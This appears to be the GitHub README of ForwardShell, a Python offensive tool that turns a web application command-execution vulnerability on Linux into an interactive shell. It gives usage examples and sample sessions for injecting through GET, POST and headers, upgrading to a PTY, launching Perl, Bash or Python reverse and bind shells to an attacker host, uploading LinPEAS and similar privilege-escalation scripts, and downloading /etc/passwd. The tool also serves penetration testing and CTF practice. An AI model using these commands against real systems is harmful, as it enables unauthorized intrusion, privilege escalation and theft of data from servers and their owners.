# ForwardShell
Exploits a simple Web application RCE on Linux systems and builds a semiautomatic shell.
It supports a PTY upgrade, Bind- and ReverseShells with different flavours, File Up- and Download and resume orphaned sessions.

![](https://github.com/61106960/ForwardShell/raw/main/images/ForwardShell.png)

ForwardShell is a Python tool to exploit a common Web application command execution on Linux operating systems. It uses MKFIFO to setup a semiautomatic shell, which can be enhanced even more with a Python PTY. Due to the used technology it support Linux OS targets only. Maybe a light ForwardShell version for Windows OS will be developed too ...  

## In fact, ForwardShell is a wrapper for a command execution vulnerability in a web application and supports the following:
* Command execution in GET and POST requests, or in certain headers 
* Parse and filter the server response to strip unneeded strings before and after the command execution output
* Multiple header support: e.g. Cookies, User-Agent, Authorization, etc.
* Proxy Support 

## To support more easy privilege escalation, ForwardShell assists with:
* Python PTY
* Bind- and Reverse Shells with Bash, Python, Netcat, Perl
* File Up- and Download (File Upload assists with pre-defined uploads like LinPEAS, LinEnum, Linux-Exploit-Suggester)
* Session resume

# How To Start

```
usage: python3 ForwardShell.py -url <url> [-data <post-data>] [-prefix <prefix>] [-suffix <suffix>] [-P <proxy>]

ForwardShell v0.4.1 - Exploits a simple Web application RCE on Linux systems and builds a semiautomatic shell

optional arguments:
  -h, --help       show this help message and exit
  -url             Target URL (e.g. http://www.site.com/upload/shell.php?cmd=<RCE>
  -data ?          Data string to be sent through POST (e.g. "cmd=<RCE>")
  -prefix          If the responses has more then the expected RCE output use -prefix to set the unneeded pattern in front the output
  -suffix          If the response has more then the expected RCE output use -suffix to define the unneeded pattern after the output
  -cookie          HTTP Cookie header value (e.g. "PHPSESSID=h5onbf...")
  -header  [ ...]  Extra header (e.g. "Authorization: Basic QWxhZ..."
  -proxy           Use a proxy to connect to the target URL [http(s)://host:port]
  -keyword         change the command injection keyword from <RCE> to another value if needed
  -verbose         Verbose output

you can use even more Bind- and ReverseShell arguments:
  -lhost           Your local listening IP address if you use the ReverseShell option
  -lport           Your local listening TCP port if you use the Bind- or ReverseShell option
  -revshell        Kind of ReverseShell [Bash, Python, Perl; default=Bash]
  -bindshell       Kind of BindShell [Python, Netcat, Perl; default=Python]
  -speed           Network speed to the target [Insane, Fast, Medium, Slow; default=Fast]
  -path            Default ForwardShell working path; Change it to /tmp if /dev/shm is not available
```

### Simple usage with a WebShell
Let's start with a very simple example.  
Imagine you have uploaded a simple WebShell to the target und the command execution output comes back without any additional stuff. You have to use the keyword '\<RCE\>', which represents the place where your commands get inserted automatically.  

```
python3 ForwardShell.py -url 'http://www.site.com/upload/shell.php?cmd=<RCE>'
```

### GET request with overloaded output
The next example covers a more realistic scenario, where the command execution is in a larger GET request and the command execution output comes back with some data (HTML code in this example) before and after it. Again, you have to use '\<RCE\>' to show ForwardShell where to put the commands in and you have to use -prefix to set the string or the RegEx of the unneeded output before the command execution output and -suffix with the string or RegEx to strip data after the needed command execution output.  

```
python3 ForwardShell.py -url 'http://www.site.com/example/testconection.php?param_one=abc&param_two=<RCE>&param_three=123' -prefix '<pre>' -suffix '</pre>
```

### POST request with overloaded output and proxy support
The next example covers a scenario, where the command execution is in a larger POST request, the command execution output comes back with some data (HTML code in this example) before it and you want to use a proxy to intercept the traffic. Now your attack is in the body of the POST request but again, you have to use '\<RCE\>' to show ForwardShell where to put the commands in and you have to use -prefix to set the string or the RegEx of the unneeded output before the command execution output and -proxy to setup the proxy connection.  

```
python3 ForwardShell.py -url 'http://www.site.com/example/testconection.php' -data 'param_one=abc&param_two=<RCE>&param_three=123' -prefix '<div>' -proxy 'http://127.0.0.1:8080'
```

### POST request with command execution in a header
In the next scenario, the command execution is in a certain header (e.g. User-Agent) of a POST request and you have to set an additional header (e.g. Authorization).  
```
python3 ForwardShell.py -url 'http://www.site.com/example/testconection.php' -data 'param_one=abc&param_two=XYZ&param_three=123' -header 'User-Agent: <RCE>' -header 'Authorization: h5onbf...'
```

### GET request with changed command execution keyword and cookie support
In the next scenario, the default keyword '\<RCE\>' cannot be used for whatever reason and you have to provide a user session cookie to access the target.
```
python3 ForwardShell.py -url 'http://www.site.com/example/testconection.php?param_one=abc&param_two=Inject-Here&param_three=123' -keyword 'Inject-Here' -cookie 'PHPSESSID=h5onbf...'
```
### Speed up your Shell
With the MKFIFO process, ForwardShell polls it periodically every second and displays the content. If the response time of the target is very good you can speed up the poll process and therefore the ForwardShell feels much more like a common shell.
```
python3 ForwardShell.py -url 'http://www.site.com/upload/shell.php?cmd=<RCE>' -speed insane
```
### Verbose Output
Obviously it sounds unneeded to explain verbose output and of course it is. Nevertheless I want to stress it a bit, because it is very likely that ForwardShell will not run out of the box with every RCE vulnerability you find a Linux web application. ForwardShell relies on a couple of binary files on the target as well as on a processable command execution output. The verbose mode helps you to find the root cause of the connection issue, especially the -prefix and -suffix configuration.
```
python3 ForwardShell.py -url 'http://www.site.com/shell.php?cmd=<RCE>' -verbose                                                       
  
[*] ForwardShell v0.4.1:
[VERBOSE] Add additional header {'User-Agent': 'ForwardShell/0.4.1', 'Content-Type': 'application/x-www-form-urlencoded'}
[VERBOSE] Using network connection speed fast
[VERBOSE] Using HTTP method GET
[VERBOSE] Using a chunk size of 1850 characters when uploading files
[*] Trying to set up ForwardShell on Target http://www.site.com
[VERBOSE] Searching file path for binary which on http://www.site.com
[VERBOSE] Found binary path /usr/bin/which by discovering target
[VERBOSE] Searching file path for binary bash on http://www.site.com
[VERBOSE] Found binary path /usr/bin/bash by using /usr/bin/which
[VERBOSE] Searching file path for binary base64 on http://www.site.com
[VERBOSE] Found binary path /usr/bin/base64 by using /usr/bin/which
[VERBOSE] Searching file path for binary cat on http://www.site.com
[VERBOSE] Found binary path /usr/bin/cat by using /usr/bin/which
[VERBOSE] Searching file path for binary cp on http://www.site.com
[VERBOSE] Found binary path /usr/bin/cp by using /usr/bin/which
[VERBOSE] Searching file path for binary echo on http://www.site.com
[VERBOSE] Found binary path /usr/bin/echo by using /usr/bin/which
[VERBOSE] Searching file path for binary grep on http://www.site.com
[VERBOSE] Found binary path /usr/bin/grep by using /usr/bin/which
[VERBOSE] Searching file path for binary gzip on http://www.site.com
[VERBOSE] Found binary path /usr/bin/gzip by using /usr/bin/which
[VERBOSE] Searching file path for binary kill on http://www.site.com
[VERBOSE] Found binary path /usr/bin/kill by using /usr/bin/which
[VERBOSE] Searching file path for binary ls on http://www.site.com
[VERBOSE] Found binary path /usr/bin/ls by using /usr/bin/which
[VERBOSE] Searching file path for binary mkfifo on http://www.site.com
[VERBOSE] Found binary path /usr/bin/mkfifo by using /usr/bin/which
[VERBOSE] Searching file path for binary mv on http://www.site.com
[VERBOSE] Found binary path /usr/bin/mv by using /usr/bin/which
[VERBOSE] Searching file path for binary perl on http://www.site.com
[VERBOSE] Found binary path /usr/bin/perl by using /usr/bin/which
[VERBOSE] Searching file path for binary ps on http://www.site.com
[VERBOSE] Found binary path /usr/bin/ps by using /usr/bin/which
[VERBOSE] Searching file path for binary rm on http://www.site.com
[VERBOSE] Found binary path /usr/bin/rm by using /usr/bin/which
[VERBOSE] Searching file path for binary sh on http://www.site.com
[VERBOSE] Found binary path /usr/bin/sh by using /usr/bin/which
[VERBOSE] Searching file path for binary tail on http://www.site.com
[VERBOSE] Found binary path /usr/bin/tail by using /usr/bin/which
[VERBOSE] Searching file path for binary python on http://www.site.com
[VERBOSE] Found binary path /usr/bin/python by using /usr/bin/which
[VERBOSE] Searching file path for binary ncat on http://www.site.com
[VERBOSE] Found binary path /usr/bin/ncat by using /usr/bin/which
[VERBOSE] Generate random session ID: 45440
[+] Connection to http://www.site.com with ID 45440 established
[*] Type ? for help
Shell:>
```
# How To Use After Start
After you have started ForwardShell, it welcomes you with some generic details an a 'Shell' prompt, where you can input your commands (e.g. whoami)
```
python3 ForwardShell.py -url http://www.site.com/shell.php?cmd=<RCE> -prefix '<pre>' -suffix '</pre>' -proxy 'http://127.0.0.1:8080'

[*] ForwardShell v0.4.1:
[*] Trying to set up ForwardShell on Target http://www.site.com
[+] Connection to http://www.site.com established
[*] Type ? for help
Shell:> whoami
www-data
Shell:> 
```

If you need help to use the included features of ForwardShell, just type ? and hit Enter.
```
Shell:> ?
[?] ForwardShell - Internal Commands:

  ?set                    Change Bind- and RervseShell parameters, like LHOST, LPORT and Shell type
  ?start                  Start a ForwardShell shell module
  ?start -m {module}      Start a specific shell module; available modules are Upgrade, RevShell and BindShell
  ?resume                 Resumes an existing shell on the target
  ?upload                 Upload a file or module to the targets working directory /dev/shm
  ?upload {filename}      Upload a file from your local working directory to the target
  ?upload -m {module}     Upload a module to the target; available modules are LinPeas, exploit-suggester and linEnum
  ?download {filename}    Download a file from the target to your local working directory
  ?exit                   Stops the shell, kills own processes, removes own files on the target system and exits the program
  ?exit -force            Stops the shell, kill all processes and files from all possible running or stuck Shells
  ?exit -silent           Pause the shell, disconnects from the target and wait to get it reconnected with ?resume

Shell:>
```
## Python PTY
Right now you have a MKFIFO shell, which isn't that bad, but far away from being a PTY. ForwardShell can help you with this and search the target for a Python2 or Python3 installation. If it finds a sufficient one, you can start a PTY upgrade simply by using '?start -m upgrade'. Now you have a PTY and you can interact with your target and certain programs (e.g. sudo, ssh, passwd, etc.) even better.
```
Shell:> ?start -m upgrade
[*] Start PTY with /usr/bin/python
Just pimping your PTY a little bit...
www-data@webserver:/var/www/html$ 
Shell:> 
```
## Bind- and ReverseShell
Maybe you want to setup a Bind- or ReverseShell, use ?set to configure LHOST, LPORT and Bindshell or Revshell type.
```
Shell:> ?set
[?] ForwardShell - ReverseShell Parameter:

  LHOST                   127.0.0.1
  LPORT                   9001
  Revshell                bash (possible values are Bash, Python, NetCat, Perl)

[?] ForwardShell - BindShell Parameter:

  LPORT                   9001
  Bindshell               python (possible values are Python, Netcat, Perl)

You can set the above parameter according to your needs, e.g.:
> ?set LHOST 192.168.0.1
> ?set LPORT 443
> ?set Revshell Python
> ?set BindShell Perl

Shell:>
```
Configure the options according your needs and after that you can start the Bind- or ReverseShell simply with '?start -m \<shelltype\>'.
```
Shell:> ?set lhost 192.168.0.1

  [+] LHOST      192.168.0.1

Shell:> ?set lport 443

  [+] LPORT      443

Shell:> ?set revshell perl

  [+] Revshell   perl

Shell:> ?start -m revshell     
[*] Starting ReverseShell with perl to 192.168.0.1 on port 443

Shell:> 
```
## Resume an Orphaned Session
Imagine you have been setup your PTY, have done some magic voodoo, connected with SSH to another box... and your connection died for whatever reason... DAMN. But as your session is within a MKFIFO process, it is still alive and you can simply re-connect to it by using ?resume and retrieve your orphaned session. 
```
Shell:> ?resume
Your own current session is: 51760
These are the current open sessions at http://www.site.com:

> Session Number 0: 51760
> Session Number 1: 54645

To which session number you want to connect to: 1
[*] Cleaning up unneeded sessions and files
[+] Switching to session 54645
Shell:>
```
## Upload Files
Likely that you want to upload a file or privesc-script to the target. Just use '?upload \<local-file\>' and the file gets uploaded to the target /dev/shm directory.
```
Shell:> ?upload linpeas.sh
[*] Calculating chunks of linpeas.sh...
[*] Uploading chunk 50 of 50 from linpeas.sh in progress...
[!] Upload finished
Shell:> ls -al /dev/shm/
ls -al /dev/shm/
total 336
drwxrwxrwt  2 root     root        120 Feb 20 23:14 .
drwxr-xr-x 18 root     root       3340 Feb 16 23:22 ..
prw-r--r--  1 www-data www-data      0 Feb 20 23:14 Fwdsh-input.54645
-rw-r--r--  1 www-data www-data   1026 Feb 20 23:14 Fwdsh-output.54645
-rw-------  1 postgres postgres  16192 Feb 16 23:22 PostgreSQL.1608135916
-rw-r--r--  1 www-data www-data 320037 Feb 20 23:14 linpeas.sh
www-data@webserver:/var/www/html$
Shell:>
```
ForwardShell has been pre-configured with some common privesc-scripts respositories. You can upload LinPEAS, LinEnum and Linux-Exploit-Suggester directly from their github repository without downloading them manually first. ForwardShell downloads the current version und uploads it directly to the target /dev/shm/ directory.
```
Shell:> ?upload
[?] ForwardShell - File Upload:

  ?upload {filename}      Upload a local file to the target /dev/shm directory
  ?upload -m {module}     Downloads a module file from the Internet source and uploads it directly to the target /dev/shm directory
                          (possible modules are LinPeas, exploit-suggester, LinEnum)

You can upload a file like:          You can upload a module like:
> ?upload linpeas.sh                 > ?upload -m LinPeas
> ?upload c:\tools\chisel            > ?upload -m exploit-suggester
> ?upload /usr/bin/ncat              > ?upload -m LinEnum

Shell:> ?upload -m linenum
[*] Calculating chunks of LinEnum.sh...
[*] Uploading chunk 8 of 8 from LinEnum.sh in progress...
[!] Upload finished
Shell:> ls -al /dev/shm
ls -al /dev/shm
total 384
drwxrwxrwt  2 root     root        140 Feb 20 23:20 .
drwxr-xr-x 18 root     root       3340 Feb 16 23:22 ..
prw-r--r--  1 www-data www-data      0 Feb 20 23:20 Fwdsh-input.54645
-rw-r--r--  1 www-data www-data   1479 Feb 20 23:20 Fwdsh-output.54645
-rw-r--r--  1 www-data www-data  46631 Feb 20 23:20 LinEnum.sh
-rw-------  1 postgres postgres  16192 Feb 16 23:22 PostgreSQL.1608135916
www-data@webserver:/var/www/html$
Shell:>
```
## Download Files
If you want to download a file to your local machine, just enter '?download \<file-path\>' and the file gets downloaded to your local working directory.
```
Shell:> ?download /etc/passwd
[*] Downloading /etc/passwd in progress...
[*] Saved the file passwd successfuly
Shell:>
```
## Exit the Program
There are three different options to exit ForwardShell. You can of course hit 'CTRL+C' and ForwardShell will exit immediately. Nonetheless, ForwardShell has been setup a MKFIFO process for you and likely you have been setup a Python PTY process. All these open processes are still running on the target and that seems get caught likely by accident.  
* If you want to close all open processes just use '?exit' and ForwardShell will do the cleanup for you.  
* If you had multiple open sessions on the target, just use '?exit -force' and ForwardShell will cleanup every open ForwardShell session.  
* If you want exit ForwardShell but leave your current session open, just use '?exit -silent' and the current session will be disconnected but stays open on the target. In this case you can simply re-connect to that session with ?resume.
```
Shell:> ?exit
[*] Cleaning up unneeded sessions and files
[*] Have a nice day :-)
```

```
Shell:> ?exit -silent
[!] ForwardShell will just be disconnected, your session 70617 stays open still
[*] Please consider command ?resume to get your orphaned session connected again...
[*] See you again soon :-)
```